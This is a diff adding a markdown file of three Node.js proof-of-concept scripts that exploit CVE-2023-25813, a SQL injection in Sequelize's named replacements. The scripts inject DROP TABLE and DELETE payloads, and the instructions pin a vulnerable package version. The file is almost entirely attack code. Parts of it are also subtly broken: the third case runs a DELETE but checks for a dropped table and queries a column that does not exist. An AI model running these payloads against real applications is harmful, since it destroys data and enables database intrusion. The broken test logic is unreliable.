@@ -1,0 +1,180 @@
+```markdown
+# Exploitation Test Cases for CVE-2023-25813 (Sequelize SQL Injection)
+
+> **Save this file as** `exploit-test-cases.md`
+
+---
+
+## Test Case 1: Raw `.query()` with Named Replacement
+
+```js
+// test-case-1.js
+
+const { Sequelize, QueryTypes } = require('sequelize');
+const sequelize = new Sequelize('sqlite::memory:'); // any dialect
+
+(async () => {
+  // 1. Setup table
+  await sequelize.query(`
+    CREATE TABLE users (
+      id INTEGER PRIMARY KEY,
+      email TEXT,
+      status TEXT
+    );
+    INSERT INTO users (email, status) VALUES
+      ('alice@example.com','active'),
+      ('bob@example.com','inactive');
+  `);
+
+  // 2. Attacker payload
+  const attackerEmail = "foo' OR 1=1; DROP TABLE users; --";
+
+  // 3. Vulnerable query
+  try {
+    await sequelize.query(
+      `
+        SELECT *
+        FROM users
+        WHERE email = :email
+          AND status = 'active'
+      `,
+      {
+        replacements: { email: attackerEmail },
+        type: QueryTypes.SELECT
+      }
+    );
+  } catch (err) {
+    console.error('Exploit triggered:', err.message);
+  }
+
+  // 4. Verify drop
+  try {
+    await sequelize.query(`SELECT COUNT(*) FROM users;`);
+    console.log('Table still exists: exploit failed');
+  } catch {
+    console.log('Table dropped: exploit succeeded');
+  }
+
+  await sequelize.close();
+})();
+```
+
+---
+
+## Test Case 2: `Model.findAll()` + `literal()` + Named Replacement
+
+```js
+// test-case-2.js
+
+const { Sequelize, DataTypes, Op } = require('sequelize');
+const sequelize = new Sequelize('sqlite::memory:');
+
+(async () => {
+  // 1. Define User model
+  const User = sequelize.define('User', {
+    firstName: DataTypes.STRING,
+    lastName:  DataTypes.STRING
+  });
+  await sequelize.sync({ force: true });
+
+  // 2. Insert sample rows
+  await User.bulkCreate([
+    { firstName: 'Alice', lastName: 'Smith' },
+    { firstName: 'Bob',   lastName: 'Jones' }
+  ]);
+
+  // 3. Attacker payloads
+  const attackerFirstName = "x'); DROP TABLE users; --";
+  const harmlessLastName = 'irrelevant';
+
+  // 4. Vulnerable findAll()
+  try {
+    await User.findAll({
+      where: sequelize.or(
+        sequelize.literal('soundex("firstName") = soundex(:firstName)'),
+        { lastName: harmlessLastName }
+      ),
+      replacements: { firstName: attackerFirstName }
+    });
+  } catch (err) {
+    console.error('Exploit triggered:', err.message);
+  }
+
+  // 5. Verify drop
+  try {
+    await User.count();
+    console.log('Table still exists: exploit failed');
+  } catch {
+    console.log('Table dropped: exploit succeeded');
+  }
+
+  await sequelize.close();
+})();
+```
+
+---
+
+## Test Case 3: (Additional scenario)
+
+```js
+// test-case-3.js
+
+// Example demonstrating that even placeholders inside string literals are replaced,
+// leading to injection in more complex templating scenarios.
+
+const { Sequelize, QueryTypes } = require('sequelize');
+const sequelize = new Sequelize('sqlite::memory:');
+
+(async () => {
+  await sequelize.query(`
+    CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT);
+    INSERT INTO items (name) VALUES ('Widget'),('Gadget');
+  `);
+
+  const payload = "anything'); DELETE FROM items; --";
+
+  // Template has two named placeholders, one in literal
+  const template = `
+    SELECT * FROM items
+    WHERE name = :itemName
+      OR description = ':itemName'
+  `;
+
+  try {
+    await sequelize.query(template, {
+      replacements: { itemName: payload },
+      type: QueryTypes.SELECT
+    });
+  } catch (e) {
+    console.error('Exploit triggered:', e.message);
+  }
+
+  // Check if items table exists
+  try {
+    await sequelize.query(`SELECT COUNT(*) FROM items;`);
+    console.log('Items table intact: exploit failed');
+  } catch {
+    console.log('Items table dropped: exploit succeeded');
+  }
+
+  await sequelize.close();
+})();
+```
+
+---
+
+## How to Run
+
+1. Install a vulnerable version of Sequelize and SQLite:
+   ```bash
+   npm install sequelize@6.19.0 sqlite3
+   ```
+2. Save each test case (`test-case-1.js`, `test-case-2.js`, `test-case-3.js`).
+3. Execute them:
+   ```bash
+   node test-case-1.js
+   node test-case-2.js
+   node test-case-3.js
+   ```
+4. You should see `Table dropped: exploit succeeded` (or equivalent) in each run.
+```
